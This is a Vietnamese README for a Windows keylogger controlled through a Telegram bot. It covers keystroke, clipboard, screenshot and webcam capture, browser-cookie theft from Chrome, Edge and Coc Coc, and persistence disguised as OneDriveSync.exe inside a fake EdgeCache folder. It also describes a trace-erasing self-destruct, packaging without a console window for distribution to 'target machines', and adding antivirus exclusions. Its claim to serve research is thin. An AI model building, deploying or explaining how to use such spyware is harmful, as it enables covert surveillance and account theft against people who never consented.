# Keylogger Giám Sát và Điều Khiển Từ Xa Qua Telegram (`klg.py`)

Dự án là một công cụ giám sát và thu thập thông tin hoạt động máy tính chạy ngầm trên Windows (phục vụ mục đích nghiên cứu an ninh mạng, kiểm soát nội bộ hoặc sao lưu cá nhân). Hệ thống được lập trình tối ưu bằng Python, hỗ trợ lưu trữ cục bộ khi mất mạng và điều khiển từ xa thời gian thực qua Telegram Bot API.

---

## 🚀 Các Tính Năng Nổi Bật

1. **Giám Sát Phím & Clipboard An Toàn**:
   * Ghi nhận phím bấm thời gian thực, lọc sạch các ký tự điều khiển ASCII rác (ví dụ: `\x01` đại diện cho tổ hợp Ctrl+A).
   * Lắng nghe Clipboard (Bộ nhớ tạm sao chép). Tự động bỏ qua nếu độ dài văn bản sao chép vượt quá **2000 ký tự** để bảo vệ hiệu năng và tránh phình dung lượng bộ đệm.

2. **Chụp Màn Hình & Webcam Định Kỳ**:
   * Tự động chụp ảnh màn hình định kỳ (mặc định 30 giây).
   * Đóng gói và gửi báo cáo phím kèm ảnh màn hình về Telegram theo chu kỳ (mặc định 120 giây).
   * Chụp ảnh webcam thời gian thực qua lệnh Telegram (sử dụng thư viện `OpenCV`, tự động bỏ qua an toàn nếu máy mục tiêu không cài đặt webcam hoặc thư viện).

3. **Thu Thập Dữ Liệu Trình Duyệt**:
   * Quét và trích xuất dữ liệu Cookie từ các trình duyệt phổ biến: **Google Chrome, Microsoft Edge, Cốc Cốc**.
   * Sử dụng thư viện `Playwright` điều khiển Headless Browser trực tiếp từ file cài đặt gốc của hệ thống máy mục tiêu, không cần tải thêm dữ liệu trình duyệt phụ.

4. **Điều Khiển Đích Danh Trên Nhiều Thiết Bị (Multi-Client Targeting)**:
   * Nếu chạy tool trên nhiều máy tính khác nhau dưới cùng một Bot Token, bạn có thể gửi lệnh điều khiển đích danh một máy bằng cách thêm hậu tố `@Tên_Máy` (ví dụ: `/webcam @Laptop-A`).
   * Các tin nhắn phản hồi từ tool gửi về Telegram luôn được dán nhãn in đậm tên máy ở đầu tin nhắn (ví dụ: `[Laptop-A] 📷 Webcam Captured`) để dễ dàng quản lý.

5. **Bảng Điều Khiển Nút Bấm Inline (Interactive Panel)**:
   * Khi gửi lệnh `/status`, mỗi máy online sẽ trả về một **Thẻ trạng thái** kèm hệ thống nút bấm tương tác nhanh bên dưới. Bấm nút dưới thẻ của máy nào thì lệnh chỉ thực thi trên máy đó, không bị chồng chéo.
   * Menu lệnh nhanh ở góc trái thanh chat (khi gõ `/`) tự động cấu hình tối giản gồm `/status` và `/help` để tránh vô tình gửi lệnh hàng loạt.

6. **Chạy Ẩn Khởi Động Cùng Windows (Startup)**:
   * Tự động sao chép chính nó vào thư mục Startup dưới tên giả lập `OneDriveSync.exe` để duy trì hoạt động ngầm mỗi khi khởi động máy.

7. **Lưu Trữ Tạm Thời & Gửi Bù Khi Mất Mạng (Outbox Queue)**:
   * Khi máy mục tiêu mất kết nối Internet, ảnh màn hình và log phím được mã hóa lưu trữ tạm thời tại thư mục Cache ẩn của hệ thống.
   * Khi có mạng trở lại, hệ thống tự động quét và gửi bù dữ liệu cũ (mặc định thử lại mỗi 60 giây).

8. **Cơ Chế Tự Hủy Hoàn Toàn (Self-Destruct)**:
   * Lệnh `/destruct` sẽ tạo một script batch độc lập chạy ngầm để giải phóng tiến trình, xóa file thực thi gốc, xóa file khởi động cùng Windows, xóa toàn bộ thư mục dữ liệu cache tạm thời và tự xóa chính nó để không để lại bất kỳ dấu vết nào.
   * Tích hợp cơ chế bỏ qua tin nhắn cũ khi khởi động lại sau tự hủy để tránh bị lặp lệnh vô hạn.

---

## 📁 Cấu Trúc Thư Mục Hoạt Động

Dữ liệu của công cụ được ẩn và lưu trữ tại đường dẫn hệ thống:
`%LOCALAPPDATA%\Microsoft\EdgeCache` (Thư mục ẩn giả lập Edge Cache để tránh bị người dùng phát hiện).

* `EdgeCache/` (Thư mục gốc)
  * `state.json` (Lưu trạng thái offset tin nhắn Telegram, các mốc thời gian gửi và cấu hình khoảng thời gian gửi/chụp).
  * `debug.log` (Lưu thông tin vận hành hệ thống).
  * `keylog_buffer.txt` (Bộ đệm lưu tạm phím bấm trước khi gửi).
  * `screenshots/` (Thư mục lưu trữ tạm thời ảnh màn hình/webcam).
  * `outbox/` (Thư mục hàng đợi chứa file chờ gửi bù khi mất mạng).

---

## 🛠️ Cài Đặt & Cấu Hình

### 1. Cài đặt các thư viện cần thiết:
```bash
pip install pyperclip pynput mss requests opencv-python playwright pywin32
```
*Sau khi cài đặt `playwright`, chạy lệnh cấu hình ban đầu:*
```bash
playwright install
```

### 2. Cấu hình biến môi trường trong mã nguồn `klg.py`:
Mở file [klg.py](file:///c:/Users/MTC%20PC/Downloads/gmail_reader/klg/klg.py) và cấu hình thông tin Telegram của bạn tại các dòng 16-17:
* `BOT_TOKEN`: Token của Telegram Bot tạo từ BotFather.
* `CHAT_ID`: ID tài khoản Telegram nhận thông báo.

---

## 🤖 Danh Sách Lệnh Điều Khiển Qua Telegram

Bạn có thể gửi lệnh trực tiếp hoặc bấm qua Menu ở góc trái chat Telegram:

| Lệnh | Mô tả | Định dạng cụ thể |
| :--- | :--- | :--- |
| `/status` | Xem trạng thái hoạt động, thời gian chạy và hiển thị bảng nút bấm điều khiển của từng máy. | `/status` hoặc `/status @Tên_Máy` |
| `/webcam` | Yêu cầu máy mục tiêu chụp ảnh webcam và gửi về. | `/webcam` hoặc `/webcam @Tên_Máy` |
| `/browser` | Trích xuất và gửi file text chứa toàn bộ Cookies trình duyệt Chrome, Edge, Cốc Cốc. | `/browser` hoặc `/browser @Tên_Máy` |
| `/clear` | Dọn dẹp sạch sẽ các ảnh màn hình tạm thời, outbox lỗi và làm trống bộ đệm phím bấm. | `/clear` hoặc `/clear @Tên_Máy` |
| `/name` | Xem tên máy hiện tại hoặc đổi tên đại diện (Alias) cho máy. | `/name` hoặc `/name <tên_mới> @Tên_Cũ` |
| `/interval` | Xem hoặc thay đổi thời gian định kỳ chụp màn hình (`screenshot`), gửi logs (`keylog`), quét thử lại (`outbox`). | `/interval <loại> <giây> @Tên_Máy` |
| `/destruct` | Kích hoạt tự hủy tool, xóa sạch file chạy, Registry Startup và thư mục Cache lưu trữ. | `/destruct` hoặc `/destruct @Tên_Máy` |
| `/help` | Hiển thị bảng hướng dẫn sử dụng chi tiết này. | `/help` hoặc `/help @Tên_Máy` |

---

## 📦 Hướng Dẫn Đóng Gói Thành File `.exe` Chạy Độc Lập

Để đóng gói mã nguồn thành một file thực thi duy nhất, không hiển thị màn hình đen console khi chạy ngầm và đóng gói đầy đủ các thư viện gọi động (`cv2`, `playwright`), hãy sử dụng lệnh `pyinstaller` sau:

```bash
# 1. Cài đặt pyinstaller nếu chưa có
pip install pyinstaller

# 2. Chạy lệnh compile
pyinstaller --onefile --noconsole --clean --hidden-import cv2 --hidden-import playwright --hidden-import pynput.keyboard._win32 klg/klg.py
```

* File đầu ra sẽ nằm trong thư mục `dist/klg.exe`. Bạn có thể đổi tên thành `OneDriveSync.exe` hoặc bất kỳ tên nào khác và phân phối tới máy mục tiêu.
* **Lưu ý**: Hãy thêm thư mục chứa file `.exe` vào danh sách loại trừ (Exclusion) của Windows Defender hoặc phần mềm Antivirus trên máy thử nghiệm để tránh bị chặn.
